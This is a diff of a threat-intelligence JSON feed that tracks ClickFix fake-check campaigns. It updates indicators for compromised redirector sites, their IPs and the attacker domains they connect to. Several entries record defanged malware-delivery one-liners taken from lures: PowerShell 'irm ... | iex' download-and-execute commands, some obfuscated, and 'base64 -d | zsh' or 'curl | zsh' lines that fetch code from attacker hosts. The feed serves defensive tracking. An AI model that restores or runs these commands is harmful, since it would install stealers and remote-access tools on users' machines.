@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5797,
+ "count": 5795,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -11265,7 +11265,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Namecheap",
-   "ip": "141.193.213.11",
+   "ip": "141.193.213.10",
    "asn": "AS209242",
    "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
    "country": "US",
@@ -77111,7 +77111,8 @@
     "codes.browse-cdn.beer"
    ],
    "lure_from": [
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -113573,19 +113574,18 @@
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
    ],
    "connects_to": [
-    "xorados.com",
     "lepafonso.bz",
     "t-trustrest.com",
+    "xorados.com",
     "hagosuro.lc",
     "trek-72.com",
-    "groverudder12.com",
     "jscdncloude.beer",
+    "groverudder12.com",
     "github.pw",
     "cloud-browse.codes"
    ],
    "lure_from": [
-    "interseq.at",
-    "code.nvc-info.beer"
+    "interseq.at"
    ]
   },
   {
@@ -120149,7 +120149,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-24",
-   "last_seen": "2026-11-24",
+   "last_seen": "2026-11-25",
    "last_online": "2026-11-25",
    "offline_since": null,
    "url": "https://gastroliver.com.pk/",
@@ -120167,7 +120167,7 @@
      "asn": "AS24940",
      "org": "HETZNER-AS Hetzner Online GmbH, DE",
      "first_seen": "2026-10-24",
-     "last_seen": "2026-11-24"
+     "last_seen": "2026-11-25"
     }
    ],
    "hosts": [
@@ -120175,7 +120175,7 @@
      "host": "gastroliver.com.pk",
      "status": "online",
      "first_seen": "2026-10-24",
-     "last_seen": "2026-11-24"
+     "last_seen": "2026-11-25"
     }
    ],
    "actor": null,
@@ -128858,13 +128858,13 @@
     "ncheck-brows.beer",
     "jscdncloude.beer",
     "cloud-browse.codes",
-    "codes.browse-cdn.beer",
-    "verifing-server.codes"
+    "codes.browse-cdn.beer"
    ],
    "lure_from": [
     "id-verfied.boats",
     "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -133503,66 +133503,6 @@
    "lure_from": []
   },
   {
-   "indicator": "hameemgroup.net",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-03",
-   "last_seen": "2026-11-15",
-   "last_online": "2026-11-25",
-   "offline_since": null,
-   "url": "https://hameemgroup.net/",
-   "brand": null,
-   "product": null,
-   "hosting": "Namecheap",
-   "dns": "namecheaphosting.com",
-   "ip": "162.213.251.150",
-   "asn": "AS22612",
-   "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "162.213.251.150",
-     "asn": "AS22612",
-     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "hameemgroup.net",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    },
-    {
-     "host": "www.hameemgroup.net",
-     "status": "online",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/click/[id]')|iex",
-    "echo \"Checking.\" && echo '[encoded]' | base64 -d | bash && echo \"Done! ; curl -fsS 'hxxps[:]//trustchecknes[.]com/x/click' >/dev/null\"",
-    "(irm 'hxxps[:]//trustchecknes[.]com/click/[id]')|iex"
-   ],
-   "connects_to": [
-    "trustchecknes.com",
-    "t-trustresnew.com",
-    "toolset17.tools"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "hamfer.com.uy",
    "type": "domain",
    "category": "clickfix",
@@ -137196,70 +137136,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "hfcberlin.de",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-17",
-   "last_seen": "2026-11-05",
-   "last_online": "2026-11-25",
-   "offline_since": null,
-   "url": "https://www.hfcberlin.de/",
-   "brand": null,
-   "product": null,
-   "hosting": "CLOUDPIT dogado GmbH",
-   "dns": "IONOS",
-   "ip": "185.137.168.153",
-   "asn": "AS45012",
-   "org": "CLOUDPIT dogado GmbH, DE",
-   "country": "DE",
-   "ips": [
-    {
-     "ip": "185.137.168.153",
-     "asn": null,
-     "org": null,
-     "first_seen": "2026-10-17",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "hfcberlin.de",
-     "status": "online",
-     "first_seen": "2026-10-17",
-     "last_seen": "2026-10-17"
-    },
-    {
-     "host": "www.hfcberlin.de",
-     "status": "online",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'jscdncloude[.]beer/[id]'|iex;",
-    "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
-   ],
-   "connects_to": [
-    "jscdncloude.beer",
-    "ncheck-brows.beer",
-    "cloud-browse.codes",
-    "codes.browse-cdn.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
-   ]
   },
   {
    "indicator": "hh88.fit",
@@ -155704,12 +155580,12 @@
     "ncheck-brows.beer",
     "cloud-browse.codes",
     "codes.browse-cdn.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -167149,10 +167025,10 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-18",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-25",
    "last_online": "2026-11-25",
    "offline_since": null,
-   "url": "https://koleva-odit.bg/",
+   "url": "https://www.koleva-odit.bg/",
    "brand": null,
    "product": null,
    "hosting": "AS velia.net Internetdienste GmbH",
@@ -167167,7 +167043,7 @@
      "asn": "AS29066",
      "org": "VELIANET-AS velia.net Internetdienste GmbH, DE",
      "first_seen": "2026-10-18",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-25"
     }
    ],
    "hosts": [
@@ -167176,6 +167052,12 @@
      "status": "online",
      "first_seen": "2026-10-18",
      "last_seen": "2026-11-19"
+    },
+    {
+     "host": "www.koleva-odit.bg",
+     "status": "unknown",
+     "first_seen": "2026-11-25",
+     "last_seen": "2026-11-25"
     }
    ],
    "actor": null,
@@ -213601,7 +213483,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-20",
-   "last_seen": "2026-11-21",
+   "last_seen": "2026-11-25",
    "last_online": "2026-11-25",
    "offline_since": null,
    "url": "https://www.paperexim.com/",
@@ -213609,11 +213491,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.83.245",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-10-20",
+     "last_seen": "2026-11-25"
+    },
     {
      "ip": "104.21.83.245",
      "asn": "AS13335",
@@ -213629,13 +213518,6 @@
      "last_seen": "2026-11-13"
     },
     {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-11-12"
-    },
-    {
      "ip": "2606:4700:3037::6815:53f5",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -213648,7 +213530,7 @@
      "host": "www.paperexim.com",
      "status": "online",
      "first_seen": "2026-10-20",
-     "last_seen": "2026-11-21"
+     "last_seen": "2026-11-25"
     }
    ],
    "actor": null,
@@ -219705,7 +219587,7 @@
    "last_seen": "2026-11-25",
    "last_online": "2026-11-25",
    "offline_since": "2026-11-25",
-   "url": "https://plshousing.org/wp-content/mu-plugins/vendor/wpex/godaddy-launch/includes/Dependencies/GoDadd",
+   "url": "https://plshousing.org/2026/09/11/[redacted]/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -230244,7 +230126,7 @@
    "status": "online",
    "first_seen": "2026-10-20",
    "last_seen": "2026-11-12",
-   "last_online": "2026-11-24",
+   "last_online": "2026-11-25",
    "offline_since": null,
    "url": "https://api-gofiq8bn7.rcgers-machinery.com/",
    "brand": null,
@@ -231513,13 +231395,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//holodeo[.]net/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
+    "(irm 'hxxps[:]//lmabagas[.]com/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x');",
+    "(irm 'hxxps[:]//holodeo[.]net/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
    ],
    "connects_to": [
-    "holodeo.net",
     "j7tracker.gb.net",
+    "lmabagas.com",
+    "holodeo.net",
     "github.pw"
    ],
    "lure_from": [
@@ -236112,11 +235995,12 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
-    "(irm 'hxxps[:]//holodeo[.]net/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
+    "(irm 'hxxps[:]//lmabagas[.]com/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x');"
    ],
    "connects_to": [
     "hagosuro.lc",
     "j7tracker.gb.net",
+    "lmabagas.com",
     "holodeo.net",
     "github.pw"
    ],
@@ -241126,12 +241010,13 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex"
+    "echo '[encoded]' | base64 -d | zsh",
+    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "github.pw",
     "j7tracker.gb.net",
+    "github.pw",
+    "entitlementcheck.pro",
     "xorados.com",
     "trek-72.com"
    ],
@@ -241677,13 +241562,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "entitlementcheck.pro",
     "j7tracker.gb.net",
+    "entitlementcheck.pro",
     "github.pw"
    ],
    "lure_from": [
@@ -296967,9 +296852,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "echo '[encoded]' | base64 -d | zsh",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+    "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "j7tracker.gb.net",
